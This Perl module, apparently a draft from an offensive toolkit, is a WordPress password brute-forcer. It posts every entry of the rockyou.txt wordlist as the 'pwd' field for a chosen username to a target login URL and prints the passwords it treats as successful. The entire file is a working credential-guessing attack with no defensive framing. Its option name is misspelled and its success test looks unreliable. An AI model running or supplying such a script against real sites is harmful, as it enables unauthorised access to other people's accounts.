package Spellbook::Bruteforce::Wordpress {
    use strict;
    use warnings;
    use LWP::UserAgent;
    use HTTP::Request::Common;

    # THIS IS A DRAFT MODULE
    our $VERSION = '0.0.1';

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, $username);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            'h|help'       => \$help,
            't|target=s'   => \$target,
            'u|usarname=s' => \$username,
        );

        if ($target) {
            open(my $wordlist, "<", "./files/rockyou.txt");

            while (<$wordlist>) {
                chomp ($_);

                my $useragent = LWP::UserAgent->new;

                my $response = $useragent -> request(POST $target, [
                    log => $username,
                    pwd => $_,
                ]);

                if ($response -> is_success) {
                    print "Successfully logged in with password: $_ \n";
                }
            }

            close($wordlist);
        }

        if ($help) {
            return "";
        }

        return 0;
    }
}

1;